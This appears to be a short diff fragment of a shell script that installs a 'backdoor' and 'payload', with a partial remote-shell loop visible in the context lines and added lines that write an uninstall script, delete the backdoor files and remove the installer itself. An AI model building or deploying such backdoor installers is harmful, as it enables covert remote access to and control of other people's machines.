@@ -118,4 +118,9 @@ while 1:
     open = open.decode()
     os.chdir(open)" > payload.py
 echo "Done.. Now install backdoor and payload"
-echo ""
+echo "rm backdoor.py
+rm payload.py
+clear
+echo "Done uninstall successfully"
+rm uninstall.sh" > uninstall.sh
+rm install.sh
